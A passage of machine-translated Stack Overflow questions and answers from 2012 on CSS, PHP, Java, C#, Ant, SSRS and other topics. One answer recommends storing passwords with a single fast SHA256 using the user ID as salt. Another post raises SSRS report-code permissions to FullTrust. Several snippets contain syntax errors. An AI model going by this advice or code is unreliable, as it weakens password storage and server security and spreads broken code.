如果您正在寻求验证一个电子邮件地址，它已经通过使用

```
filter_var('bob@example.com', FILTER_VALIDATE_EMAIL) 
```

手册： http: [//php.net/manual/en/function.filter-var.php](http://php.net/manual/en/function.filter-var.php)

# html - 绝对定位变化 1px

> ID：13076711
> 
> 赞同：1
> 
> 时间：2012-10-25T20:26:38.363
> 
> 标签：html, css, css-position

我的网站有一个固定在顶部中心的单一背景。我有一些空白 s，在鼠标悬停时，应该切换绝对定位的具有不同背景的显示，该背景应该与原始背景对齐。

功能一切正常；然而，与背景并不总是一致的。它根据屏幕大小变化 1px。

这发生在 Chrome 中，但不是 Dreamweaver。我没有测试过其他浏览器。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T21:34:24.330

这个问题实际上是一个亚像素渲染问题。我刚刚将元素的 css 从“left: 0px;”更改为 到“左：-0.5px；” 一切正常。

感谢 Mike Robinson 的评论和链接：[http ://css3wizardry.com/2010/10/05/subpixel-rendering-2/](http://css3wizardry.com/2010/10/05/subpixel-rendering-2/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T21:00:20.440

Dreamweaver 的实时视图是个笑话，除了粗略的预览，不要相信它，尤其是单个像素差异。如果像单像素差异这样的问题对您来说是个问题，请在主要浏览器中进行测试并在应用您自己的样式之前使用 CSS 重置或 normalize.css。

CSS 重置 - 将所有样式重置为 0，以便所有浏览器都以相同的基线样式开始。缺点是您必须为您打算使用的每个元素设置样式，列表等内容将不再具有默认样式并显示为纯文本。[http://meyerweb.com/eric/tools/css/reset/](http://meyerweb.com/eric/tools/css/reset/)

Normalize.css - 这比重置更加用户友好，它为所有基本元素提供相同的样式，以便所有主要浏览器默认设置都被覆盖并呈现相同。[http://necolas.github.com/normalize.css/](http://necolas.github.com/normalize.css/)

# php - 使用变量时计数

> ID：13076715
> 
> 赞同：0
> 
> 时间：2012-10-25T20:26:53.963
> 
> 标签：php, mysql

每次使用变量时我都想“计数”

我有一些正则表达式可以帮助过滤掉基于关键字的内容，它们位于访问文件目录的 foreach 循环中，然后帮助过滤掉每个文件应该属于的类别，即“税收、纳税申报表、工资单等”。我现在想计算每次使用变量（包含正则表达式）的时间，然后将其存储为要在另一个循环中使用的变量，解决这个问题的最佳方法是什么？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:31:48.420

```
$usedMyRegExcount = 0;
//use me wherever you use your regex
function getRegEx()
{
   usedMyRegExCount++;
   return "someregexstring";
} 
```

顺便说一句，您*应该*能够在没有这种技术的情况下确定性地推断出使用变量的时间...例如，如果您有 for(i = 0; i< n; i++) //do something with regex

那你已经用了n次了……

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:41:14.070

当您必须为人们写出来而不是查看整个代码时，这一点非常明显。

我有这样的事情：

```
if (preg_match($regexAstronomy, $itemtitle))
{
    $categoryid = '1891';
} 
elseif (preg_match($regextaxes1, $itemtitle) AND preg_match($regexCategoryreturn, $productsgroupmessage) or preg_match($regextaxes2, $itemtitle) AND preg_match($regexCategoryreturn, $productsgroupmessage) )
{
    $categoryid = '1918';
} 
elseif (preg_match($regexpaystub, $itemtitle))
{
    $categoryid = '414';
} 
elseif (preg_match($regexcreditloan, $itemtitle))
{
    $categoryid = '1903';
}
elseif (preg_match($regexdebitloan, $itemtitle)) 
```

..等，所以我只是添加了这个：

```
if (preg_match($regexAstronomy, $itemtitle))
{
    $categorycounter1891 = '0';
    $categoryid = '1891';
    ++$categorycounter1891;
} 
```

# shopify - Shopify OAuth 步骤 2 问题

> ID：13076719
> 
> 赞同：0
> 
> 时间：2012-10-25T20:27:01.993
> 
> 标签：shopify

当我们尝试发布身份验证过程第 2 步的请求时，在向[https://hamill-murazik-and-johnston6698.myshopify.com/admin/oauth/access_token发送请求时收到 http 400 错误](https://hamill-murazik-and-johnston6698.myshopify.com/admin/oauth/access_token)

我们能够通过第 1 步并获得临时代码。但是当我们尝试发布 client_id、client_secret 和代码时，我们得到了 http 400 错误。

代码如下所示

```
public static void runTest() {
    // TODO Auto-generated method stub
    try{
    URL url = new URL("https://hamill-murazik-and-johnston6698.myshopify.com/admin/oauth/access_token");           
     HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
     String urlParameters = URLEncoder.encode("client_id", "UTF-8") + "=" + URLEncoder.encode("<CLIENT_ID", "UTF-8");
     urlParameters += "&" + URLEncoder.encode("client_secret", "UTF-8") + "=" + URLEncoder.encode("<CLIENT_SECRET", "UTF-8");
     urlParameters += "&" + URLEncoder.encode("code", "UTF-8") + "=" + URLEncoder.encode("15f01c0d8b235ffb63234c1c48822432", "UTF-8");

     /*connection.setDoInput(true);
     connection.setDoOutput(true);
     connection.setUseCaches(false);
     connection.setAllowUserInteraction(false);
     connection.setRequestProperty("Content-Length", Integer.toString(102454));
     connection.setRequestProperty("Content-Type", "text/plain");*/

     connection.setUseCaches(false);
     connection.setAllowUserInteraction(false);
     connection.setDoOutput(true);
     connection.setRequestProperty("Content-Length", "" + Integer.toString(urlParameters.getBytes().length));

     DataOutputStream wr = new DataOutputStream(connection.getOutputStream ());
     wr.writeBytes(urlParameters);
     wr.flush();
     wr.close();

        BufferedReader in = new BufferedReader(
                new InputStreamReader(
                connection.getInputStream()));
        String decodedString;
        while ((decodedString = in.readLine()) != null) {
        System.out.println(decodedString);
        }
        in.close();

    }catch(Exception e){
        e.printStackTrace();

    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T15:48:37.263

我建议您使用真正的 HTTP 客户端库，例如[Apache HttpClient 库](http://hc.apache.org/httpclient-3.x/)。您很有可能在请求中遗漏了某些内容或编码不正确。

该库还将提供一个更简单的接口来使用，因此您只需为您的 HTTP 参数传递键值参数之类的东西，它就可以工作了。

此外，您似乎正在将您的授权请求附加到您的 URL 参数中。您需要为该请求发出 POST 请求。在您当前的实现中，您必须在 Body 中发送它，这在纯 Java 中可能会很尴尬。

我强烈建议使用 HttpClient 库，如果这对您有帮助，请告诉我们。

# jsf - Servlet 映射 jsf

> ID：13076724
> 
> 赞同：0
> 
> 时间：2012-10-25T20:27:10.503
> 
> 标签：jsf

我在问自己哪种方式最适合 jsf 中的 servlet 映射？为什么？

特别是我总是想知道 facelet 资源的不同后缀和 servlet-mapping 的 url-pattern 的后缀。我的 servlet 映射始终与我的资源的后缀保持一致。

例如，如果我使用 xhtml 作为 facelets，我的 servlet 映射也会这样做：

```
 <servlet-mapping>
     <servlet-name>Faces Servlet</servlet-name>
     <url-pattern>*.xhtml</url-pattern>
  </servlet-mapping> 
```

但是我看到了资源是 xhtml 文件并且 servlet 映射在 jsf 上的示例？

例如：

```
 <servlet-mapping>
     <servlet-name>Faces Servlet</servlet-name>
     <url-pattern>*.jsf</url-pattern>
  </servlet-mapping> 
```

那么哪种方式是最好的方式呢？

而且我想知道为什么第二种方式工作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:50:42.613

我认为，现在您不需要回答要使用哪个 servlet 映射。您可能会更好地先阅读一些内容。我冒昧地找到了两个相关的问题，考虑到 JSF 和文件扩展名，这可能会让你大开眼界。

*   [使用 .jsp 或 .xhtml 或 .jsf 扩展名创建 JSF 页面有什么区别](https://stackoverflow.com/questions/7914660/what-is-the-difference-between-creating-xhtml-or-jsp-or-jsf-for-jsf-pages)
*   [JSF Facelets：有时我看到 URL 是 .jsf，有时是 .xhtml。为什么？](https://stackoverflow.com/questions/3008395/jsf-facelets-sometimes-i-see-the-url-is-jsf-and-sometimes-xhtml-why)

# c# - 在 NetSuite SuiteTalk Web 服务中将 SalesOrderItem 添加到 SalesOrder

> ID：13076730
> 
> 赞同：2
> 
> 时间：2012-10-25T20:27:36.353
> 
> 标签：c#, web-services, netsuite

我正在尝试使用 NetSuite Web 服务放置一个简单的 SalesOrder，并且我认为这是一个非常简单的过程，运气为零：

首先，我实例化我的对象以用于 Web 服务：

```
SalesOrder order = new SalesOrder();
SalesOrderItemList items = new SalesOrderItemList();
SalesOrderItem item = new SalesOrderItem(); 
```

现在你会认为我会寻找一些方法，比如：

```
items.Add(item); 
```

要创建我的 SalesOrderItems 列表，但现在存在这样的方法，或者任何类似的东西，我似乎可以环绕我的头。我有 SuiteTalkWebServices 平台指南并已通读，我很困惑。

这个API有什么好的参考吗？我认为缺少 NetSuites。顺便说一句，我正在使用 C#。

## 更新：

我通过谷歌搜索找到了这个 PDF，帮助很大：http:
[//www.netsuite.com/portal/partners/integration/download/SuiteTalkWebServicesPlatformGuide_2011.2.pdf](http://www.netsuite.com/portal/partners/integration/download/SuiteTalkWebServicesPlatformGuide_2011.2.pdf)

让我感到震惊的是我需要创建一个数组，然后将该数组分配给定义的对象，而不是像我假设的那样一一添加东西。整个 API 都是这样工作的，所以一旦你完成了它，你就很好了（基本测试将 2 个项目添加到订单中）：

```
// create sales order
            SalesOrder so = new SalesOrder();
            SalesOrderItem[] orderItemsArray = new SalesOrderItem[2];

            for (int i = 0; i < orderItemsArray.Length; i++)
            {
                SalesOrderItem item = new SalesOrderItem();
                item.quantity = i;
                item.description = "test item" + i;
                item.amount = (double)75.00;
                orderItemsArray[i] = item;
            }

            SalesOrderItemList orderItems = new SalesOrderItemList();
            orderItems.item = orderItemsArray;
            so.itemList = orderItems;

            so.orderStatus = SalesOrderOrderStatus._pendingApproval;
            service.add(so); 
```

还有更多需要做的事情，但至少这应该让任何人继续前进。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:56:04.983

在回答您的参考问题时，有几个资源可能会有所帮助。

*   [Netsuite 用户表单](https://usergroup.netsuite.com/users/forumdisplay.php?f=24)- 该论坛得到快速回复，Netsuite 员工经常会回复问题（需要注册，但免费）
*   我写了[一篇博客](http://www.ozonesolutions.com/programming/tag/netsuite/)，其中包含许多 Netsuite API 调用的 PHP 代码示例。它不是 C#，但您可能仍然会发现它很有用。（更重要的是，这是一个[销售订单请求](http://www.ozonesolutions.com/programming/2012/01/netsuite-webservices-and-multiple-item-sales-orders/)的示例）

我强烈建议浏览 Netsuite Usergroup 论坛，它有很多代码示例。

# xpages - 在扩展页面对话框中放大图像？

> ID：13076732
> 
> 赞同：0
> 
> 时间：2012-10-25T20:27:42.263
> 
> 标签：xpages

我在扩展页面对话框中有一个图像，当鼠标在图像上平移时我想放大它。

我发现了一些 js 和 css：

[http://www.nihilogic.dk/labs/mojomagnify/](http://www.nihilogic.dk/labs/mojomagnify/)

如果图像在主页上，效果很好。但如果图像在扩展页面对话框中，则弹出对话框，将鼠标移到图像上，鼠标指针不会变为十字线，图像不会被放大。

关于为什么的任何理论？还是现在修复？

任何可以在对话框中使用的放大图像？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:54:25.497

该对话框可能是动态加载和触发的，并且使用部分刷新，因此您的 JavaScript 在对话框可用之前就已加载。

onClientLoad 事件仅在 xpage 加载时触发。不进行部分刷新

您需要做的是确保您的 JavaScript 在对话框可用后加载。这可以使用另一个 JavaScript 来完成，该 JavaScript 侦听在此处找到的部分刷新事件

[http://dontpanic82.blogspot.se/2010/01/xpages-hijackingpublishing-partial.html](http://dontpanic82.blogspot.se/2010/01/xpages-hijackingpublishing-partial.html)

# c# - 循环通过具有相同节点值的 XML

> ID：13076733
> 
> 赞同：1
> 
> 时间：2012-10-25T20:27:47.213
> 
> 标签：c#, xml, loops, recursion, linq-to-xml

我在遍历 XML 文件并将其表示为例如 TreeView 时遇到了困难。我的 XML 的结构如下所示：

```
<Categories>
  <Category Name="Cat Level1">
    <Categories>
      <Category Name="ChildCat Level 2">
        <Categories>
          <Category Name="ChildCat Level3_1" />
          <Category Name="ChildCat Level3_2" />
        </Categories>
      </Category>
    </Categories>
  </Category>
</Categories> 
```

我写了一个递归函数来循环这个 XML，这里是：

```
private void CreateTreeStructure(XDocument xDoc)
{
    foreach(var element in xDoc.Descendants("Category"))
    {
        var node = new TreeNode(element.Attribute("Name").Value);
        treeView1.Nodes.Add(node);
        ReadChildren(element.Descendants("Categories"), node);
    }
}

private void ReadChildren(IEnumerable<XElement> element, TreeNode node)
{
    foreach (var child in element.Descendants("Category"))
    {
        var childNode = new TreeNode(child.Attribute("Name").Value);
        node.Nodes.Add(childNode);
        ReadChildren(child.Descendants("Categories"), childNode);
    }
} 
```

结果是预期的和非预期的。我希望这个 XML 在 TreeView 中，所以结果应该类似于：

*   猫 1 级
    *   ChildCat Level2
        *   ChildCat Level3_1
        *   ChildCat Level3_2

但结果如下所示：

*   猫 1 级
    *   ChildCat Level2
        *   ChildCat Level3_1
        *   ChildCat Level3_2
    *   ChildCat Level3_1
    *   ChildCat Level3_2
    *   ChildCat Level3_1
    *   ChildCat Level3_2
*   ChildCat Level2
    *   ChildCat Level3_1
    *   ChildCat Level3_2
*   ChildCat Level3_1
*   ChildCat Level3_2

经过一番调试，我发现这是因为我的递归代码正在寻找后代“类别”，但子类别节点也被命名为“类别”。因此，应该只找到元素“Cat Level 1”的第一个函数也循环遍历名为 Category 的其他节点。现在我有点坚持这一点，我无法改变 XML 的结构。

那么，有没有人知道如何循环这个 XML 而无需每次都读取**所有子节点？**提前致谢！

## 更新：

感谢*“davisoa”*的回答，我设法解决了这个问题。下面是我使用的代码，所以如果有人有同样的问题，这里是答案：

```
private void CreateTreeStructure(XDocument xDoc)
{
    foreach (var element in xDoc.Root.Elements("Category"))
    {
        var node = new TreeNode(element.Attribute("Name").Value);
        treeView1.Nodes.Add(node);
        if (element.HasElements) 
            ReadChildren(element.Element("Categories"), node);
    }
}

private void ReadChildren(XElement element, TreeNode node)
{
    foreach (var child in element.Elements("Category"))
    {
        var childNode = new TreeNode(child.Attribute("Name").Value);
        node.Nodes.Add(childNode);
        if(child.HasElements)
            ReadChildren(child.Element("Categories"), childNode);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T21:57:59.140

如果您使用该`Elements`方法而不是`Descendants`它，则只会返回直接子级。这应该可以解决问题。

`Elements`文档在[这里](http://msdn.microsoft.com/en-us/library/bb348975.aspx)。

# encryption - 使用 SHA1 作为链中最内层的散列进行散列

> ID：13076740
> 
> 赞同：2
> 
> 时间：2012-10-25T20:28:24.117
> 
> 标签：encryption, cryptography, sha

客户端程序（我无法控制）通过向我发送密码进行身份验证，密码为`SHA1(password)`.

我不愿意在我的数据库中存储仅使用 SHA1 散列的密码，所以我建议将密码存储在散列为的数据库中`SHA256(SHA1(password))`（其中密码使用 PBKDF-2 或类似的东西在多次迭代中散列）。

我的问题是：在这种情况下，使用 SHA1 的最内层哈希有什么不安全的地方吗？我意识到冲突的可能性会增加，但由于这只是为了在数据库中存储密码，我认为我不需要担心这一点。还有什么我想念的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T11:27:42.143

如果客户端总是向您发送相同的密码，只是 SHA1 散列，那么 SHA1 散列输出*就是*密码，用于所有意图和目的。以与任何其他密码相同的方式处理和存储它，例如使用 PBKDF2、SCrypt 或 BCrypt。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:42:30.900

考虑在进行最终加密之前添加每行唯一的盐。例子：

假设您收到`W6ph5Mm5Pz8GgiULbPgzG37mj9g=`（的 SHA1 加密`"password"`）。这与用户相关联，该用户应具有唯一键，例如用户 ID 和/或用户名。

我的建议 - 为了避免冲突 - 将 Bytes 转换为 Base64String （在 C# 中，这将是`Convert.ToBase64String( byteVariable )`- 然后连接到用户的唯一 ID 的字符串上（使新字符串类似于：

`W6ph5Mm5Pz8GgiULbPgzG37mj9g=+103`（我添加`+103`以反映用户的 ID） - 然后应用您的 SHA256 算法。这将产生：`mNXRjWsKJ7V+BHbAuwJJ7neGT+V1IrLQSQXmb4Vv1X8=`- 您可以将其存储在数据库中。SHA256 哈希 - 消除了不太安全的 SHA1 算法的冲突。

而且 - 由于您使用的是单向加密 - 当您将来检查密码是否有效时，您只需在检查之前再次附加用户的 ID。

# java - 在构建错误后在 ANT 停止的地方继续

> ID：13076743
> 
> 赞同：1
> 
> 时间：2012-10-25T20:28:40.550
> 
> 标签：java, android, ant, build, build-process

我有一个`ant`构建许多`android`项目的构建脚本。

我正在按照文本文件中的属性给我的特定顺序构建所有项目。

`ant`构建脚本调用每个项目自己的文件`build.xml`来构建该项目。

**如果一个项目无法构建，我怎么能从`ant`它因为错误而停止的地方继续构建？**

基本上，如果我正在构建项目`A`、、、和。并且构建过程失败了，当开发人员再次开始构建时，我该怎么做才能让构建过程继续？`B``C``D``E``C``C`

此外，构建过程需要重建开发人员更改的内容。例如， 中的问题`C`是由于 中的问题`A`，并且`C`取决于`A`。因此，它需要重建`A`、跳过`B`、重建`C`和继续。oO

寻找想法或者是否已经有这样做的东西。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T03:18:17.450

与 Make 一样，Ant 非常擅长在您停止时确定从哪里继续。除非更新源，否则该`<javac>`任务不会重新编译代码。默认情况下，该`<copy>`任务不会重新复制文件。但是，如果您将构建分解为多个文件，然后使用`<ant>`任务而不是使用您的`depends`参数`<target>`，您将破坏这个系统。

假设您有独立的项目*A*、*B*、*C*和*D*。你`build.xml`所做的就是在每一个中调用正确的目标。假设每个人都构建了一个 jar 文件。由于 Java 错误，该过程在项目*C上中断。*开发商修好了。你`build.xml`再次运行你的，它会再次调用项目*A*和*B。*但是，由于这些项目已经建成，他们不应该做任何事情。您会看到对*A*和*B*的调用，但什么都不会发生。

即使在项目*C*中，构建过程也会从它停止的地方开始。也就是说，如果您没有做任何事情来破坏 Ant 计算其构建的能力。

破解 Ant 的方法有很多。例如，不要在构建过程中删除文件。如果目标文件不再存在，Ant 就无法使用时间戳来确定要做什么。

有时，流程需要一些帮助来避免构建。Ant 有一个内置`<uptodate>`任务，但我发现它[`<outofdate>`](http://ant-contrib.sourceforge.net/tasks/tasks/outofdate.html)更容易使用。例如，假设项目*A*生成项目*B*使用的 jar 文件。如果 jar 中使用的类文件和资源早于 jar 上的时间戳，您可能希望使用这些任务之一不复制该 jar。

否则，如果您只是盲目地将 jar 复制到 Project *B*，Project *B*将看到类文件所依赖的文件已更新。因此，项目*B*将重新编译所有内容。然后复制所有内容，并重建它正在构建的任何罐子或战争。我遇到了直接更新 Java 类文件的[第三方任务的问题，并且不得不使用监视文件来确保我没有运行两次编译，尤其是处理类文件的任务。](https://stackoverflow.com/q/12963878/368630)

顺便说一句，不要对 Ant 所说的正在执行的目标感到不安。Ant 将执行这些目标，但构成这些目标的任务将不会运行，除非更新某些内容。

* * *

### 更新：使用`<outofdate>`来自 Ant-Contrib

假设在您的主项目文件中，您有以下目标：

```
<target name="build"
    description="Builds every sub project">
    <ant antfile=${project.a.dir}/build.xml target="build"/>
    <ant antfile=${project.b.dir}/build.xml target="build"/>
    <ant antfile=${project.c.dir}/build.xml target="build"/>
    <ant antfile=${project.d.dir}/build.xml target="build"/> 
```

使用`<outofdate>`：

```
<target name="build"
    description="Builds every sub project">

    <outofdate>
       <sourcefiles>
           <fileset dir="${project.a.srcdir}"/>
       </sourcefiles>
       <targetfiles>
           <fileset dir="${project.a.dir}/target">
              <include name="*.jar"/>
           </fileset>
       </targetfiles>
       <sequential>
           <ant antfile=${project.a.dir}/build.xml
               target="build"/>
       </sequential>
    </outofdate>

    <outofdate>
       <sourcefiles>
           <fileset dir="${project.b.srcdir}"/>
       </sourcefiles>
       <targetfiles>
           <fileset dir="${project.a.dir}/target">
              <include name="*.jar"/>
           </fileset>
       </targetfiles>
       <sequential>
           <echo>CALLING PROJECT: ${project.b.dir}</echo>
           <ant antfile=${project.b.dir}/build.xml
               target="build"/>
       </sequential>
    </outofdate>

    <etc, etc, etc/> 
```

如果设置正确，您可能可以在 Ant-Contrib`<for>`循环中完成整个操作，因此您不必为每个子项目都这样做。

我不知道这是否更快。该`<outofdate>`任务仍然需要遍历所有文件并进行日期比较，但至少您没有看到它调用了子项目文件中的所有目标。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T22:10:26.203

尽可能尝试使您的个人项目构建具有[*幂等*](http://dictionary.reference.com/browse/idempotent)性（即，如果您重新运行构建并且自上次以来没有任何更改，那么它不必重新构建所有内容）。像这样的标准任务已经像`javac`这样`copy`工作了，例如`javac`只重新编译`.java`比它们对应的`.class`. 对于不自己进行依赖检查的情况，您可以使用该`uptodate`任务自己进行检查。[更新手册页中](http://ant.apache.org/manual/Tasks/uptodate.html)的示例显示了如何执行此操作。

这个想法是让每个构建都做它必须做的最少的工作，以使一切都保持最新。如果你能做到这一点，那么重建`C`原因`A`并`B`再次运行并不重要，因为如果它们实际上没有任何事情可做，它们将很快完成。

# asp.net - 在 InstallShield 2012 Spring LE 中创建正确的应用程序池

> ID：13076745
> 
> 赞同：0
> 
> 时间：2012-10-25T20:28:51.730
> 
> 标签：asp.net, web-applications, installshield

如何在 InstallShield 2012 Spring LE 中设置 Web 应用程序期间创建（或选择是否已创建）应用程序池？应用程序池应具有允许 32 位应用程序、NETWORK SERVICE 用户帐户的特定功能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T23:28:24.720

与 InstallShield 2012 专业版相比，InstallShield 2012 限量版在 IIS ASP.NET 配置（和其他方面）方面存在很大缺陷。

因此，要么升级到 Pro，要么使用由 Windows Installer XML 编写的合并模块“增强”InstallShield。WiX 有一个 IIS 扩展，可以做你想做的事。有关相关的高级概述，请参阅以下博客文章：

[使用 Windows Installer XML 增强 InstallShield - 证书](http://blog.iswix.com/2011/01/augmenting-installshield-using-windows_19.html)

# php - 搜索多个数组

> ID：13076747
> 
> 赞同：3
> 
> 时间：2012-10-25T20:28:53.927
> 
> 标签：php, arrays, search, multidimensional-array

我已经正式碰壁了，我无法弄清楚这个问题的解决方案。任何帮助将非常感激！我已经尝试过[array_intersect()](http://php.net/manual/en/function.array-intersect.php)但它只是继续针对函数中的第一个数组运行，这是行不通的。

我有无限数量的数组（出于演示目的，我将显示 4 个），例如：

```
// 1.
array(1,2,3,4,5);
// 2.
array(1,3,5);
// 3.
array(1,3,4,5);
// 4.
array(1,3,5,6,7,8,9); 
```

我需要弄清楚如何搜索所有数组并只找到所有 4 个数组中存在的数字。在此示例中，我只需要从数组中提取值 - 1、3 和 5。

PS：实际上，如果该函数可以搜索多维数组并仅提取数组中所有数组中匹配的数字，那将是最好的。

非常感谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T21:00:13.703

有趣的问题！这有效：

```
function arrayCommonFind($multiArray) {

    $result = $multiArray[0];
    $count = count($multiArray);
    for($i=1; $i<$count; $i++) {
        foreach($result as $key => $val) {
            if (!in_array($val, $multiArray[$i])) {
                unset($result[$key]);
            }
        }
    }
    return $result;
} 
```

请注意，您可以只使用 $multiArray[0] （或*任何子*数组）作为基线并检查所有其他值，因为最终结果中的任何值都必须在所有单独的子数组中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:37:39.217

如果它在一个多维数组中，你可以

```
$multiDimensional = array(/* Your arrays*/);
$found = array_pop($multiDimensional);
foreach($multiDimensional as $subArray)
{
  foreach($found as $key=>$element)
  { 
    if(!in_array($element, $subArray)
    {
      unset($found[$key]);
    }
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T20:43:32.133

这个怎么样？

找出数组 1 和 2 中都存在的数字。然后将这些结果与数组 3 进行比较以再次找到公共数字。只要你愿意，继续前进。

这是你的意思吗？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T21:07:54.290

根据您对我的其他问题的评论，这是一个更好的解决方案：

```
<?php
// 1\. merge the arrays
$merged_arrays = array_merge( $arr1, $arr2, $arr3, $arr4, ...);
// 2\. count the values
$merged_count = array_count_values( $merged_arrays );
// 3\. sort the result for elements that only matched once
for( $merged_count as $key => $value ){
    if ($value == 1) {
        // 4\. unset the values that didn't intersect
        unset($merged_count($key));
    }
}
// 5\. print the resulting array
print_r( $merged_count ); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-01-30T14:45:37.787

`in_array()`随后执行迭代调用`unset()`是过度处理，它忽略了`array_intersect()`真正应该成为这种情况下任何可靠解决方案的英雄的魔力。

这是一个精益迭代函数：

代码：（[演示](http://sandbox.onlinephpfunctions.com/code/f55a7e7a1f476cc70c034ac19243a55758b908f7)）

```
function array_intersect_multi($arrays){ // iterative method
    while(sizeof($arrays)>1){
        $arrays[1]=array_intersect($arrays[0],$arrays[1]);  // find common values from first and second subarray, store as (overwrite) second subarray
        array_shift($arrays);  // discard first subarray (reindex $arrays)
    }
    return implode(', ',$arrays[0]);
}
echo array_intersect_multi([[1,2,3,4,5],[1,3,5],[1,3,4,5],[1,3,5,6,7,8,9]]);
// output: 1, 3, 5 
```

这假设您将单个数组打包成一个索引数组。

* * *

我也考虑过递归函数，但递归速度较慢并且使用更多内存。

```
function array_intersect_multi($arrays){ // recursive method
    if(sizeof($arrays)>1){
        $arrays[1]=array_intersect($arrays[0],$arrays[1]);  // find common values from first and second subarray, store as (overwrite) second subarray
        array_shift($arrays);  // discard first subarray (reindex $arrays)
        return array_intersect_multi($arrays);  // recurse
    }
    return implode(', ',$arrays[0]);
} 
```

* * *

此外，如果您乐于将数组扁平化为一个`array_merge()`并声明正在处理的单个数组的数量，您可以使用它：

> （最快的方法）

代码：（[演示](https://3v4l.org/GOqVr/perf#output)）

```
function flattened_array_intersect($array,$total_arrays){
    return implode(', ',array_keys(array_intersect(array_count_values($array),[$total_arrays])));
}
echo flattened_array_intersect(array_merge([1,2,3,4,5],[1,3,5],[1,3,4,5],[1,3,5,6,7,8,9]),4); 
```

或替换`array_intersect()`为`array_filter()`（稍慢且更冗长）：

```
function flattened_array_intersect($array,$total_arrays){
    return implode(', ',array_keys(array_filter(array_count_values($array),function($v)use($total_arrays){return $v==$total_arrays;})));
}
echo flattened_array_intersect(array_merge([1,2,3,4,5],[1,3,5],[1,3,4,5],[1,3,5,6,7,8,9]),4); 
```

# java - Java FileHandling 类层次结构逻辑

> ID：13076751
> 
> 赞同：0
> 
> 时间：2012-10-25T20:29:33.967
> 
> 标签：java, bufferedreader, outputstream, file-handling

我昨天刚学了文件处理。我对类的使用感到困惑。例如，一些例子是这样的

```
 Paths  myfile= paths.get("c:\\Sample.txt");
  OutputStream  opt= new  BufferedOutputStream(myfile.hew OutputStream(CREATE));
  BufferedWriter br= new BufferedWriter( new OutputStreamWriter(opt));
  br.write();.....  ;       

and so on 
```

这是一种方法，我在某处找到

```
 BufferedWriter bf = new BufferedWriter( new FileWriter("c:\\Sample.txt"));
  bf.write("Hello  File Handling ");' 
```

我不担心在上面的代码中它是否正在创建文件而第二个正在编写。我想问一下

在第一个中，我们使用父（OutputStream）类，然后代码运行，
在第二个中，我们直接使用 BufferedWriter 而不是使用父类，那么这样做的逻辑是什么，我的意思是如果我们使用父类有什么不同吗在做大事的时候，或者我们可以追求任何逻辑

谢谢你的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:39:59.310

有点不清楚您在问什么，但是 Java IO 类使用装饰器模式来实现从输入或输出流读取和写入的不同方式。这允许的是数据加载和写入方式的灵活性，因为每个都允许您装饰当前类型。

[IO 的装饰器模式](https://stackoverflow.com/questions/6366385/decorator-pattern-for-io)

[装饰图案](http://en.wikipedia.org/wiki/Decorator_pattern)

# heroku - 在 Heroku 上托管 Dart 应用程序的问题

> ID：13076753
> 
> 赞同：2
> 
> 时间：2012-10-25T20:29:42.463
> 
> 标签：heroku, cloud, dart

我正在尝试在云中托管 Google Dart 网站。到目前为止，我在以下位置找到了一个教程：

[http://blog.sethladd.com/2012/08/running-dart-in-cloud-with-heroku.html](http://blog.sethladd.com/2012/08/running-dart-in-cloud-with-heroku.html)

但是尽管完全遵循它，我还是无法让它工作。我也在等待来自[dartvoid.com](http://dartvoid.com)的邀请。现在还有其他方法可以让我的网站与 Dart 一起使用吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-27T14:54:04.163

[Seth 文章](http://blog.sethladd.com/2012/08/running-dart-in-cloud-with-heroku.html)中的示例运行良好。我不得不将 Procfile 中列出的文件更改为 'main' 函数所在的 dart 文件。

# reporting-services - 在 SSRS 2008 报表管理器中获取用户/客户端查看报表的 IP 地址

> ID：13076761
> 
> 赞同：3
> 
> 时间：2012-10-25T20:30:31.370
> 
> 标签：reporting-services, ssrs-2008, ip-address

必须有办法做到这一点。我只需要一种方法来公开在 SQL 2008（不是 r2）报表服务器上查看报表的用户的 IP 地址（或计算机名称 - 但我认为 IP 更容易获得）。这是我已经尝试过的：

1.  在报告代码块中编写代码获取IP地址如：

    ```
    Public Function GetClientIP() As String
        Dim sReturn As String = ""
        Dim ipHost As System.Net.IPHostEntry = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName())

        For i As int32 = 0 To ipHost.AddressList.Length - 1
            If (Not ipHost.AddressList(i) Is Nothing AndAlso ipHost.AddressList(i).ToString().Trim() <> "" AndAlso ipHost.AddressList(i).ToString().Length() <= 15) Then
                sReturn = ipHost.AddressList(i).ToString()
            End If
        Next i

        Return sReturn
    End Function 
    ```

    起初，这给了我各种安全权限错误，我可以通过在 rssrvpolicy.config 中将 Report_Expressions_Default_Permissions 的 PermissionSet 更改为 FullTrust 来解决它：

    ```
    <CodeGroup
      class="UnionCodeGroup"
      version="1"
      PermissionSetName="FullTrust"
      Name="Report_Expressions_Default_Permissions"
      Description="This code group grants default permissions for code in report expressions and Code element. ">
      <IMembershipCondition
      class="StrongNameMembershipCondition"
      version="1"
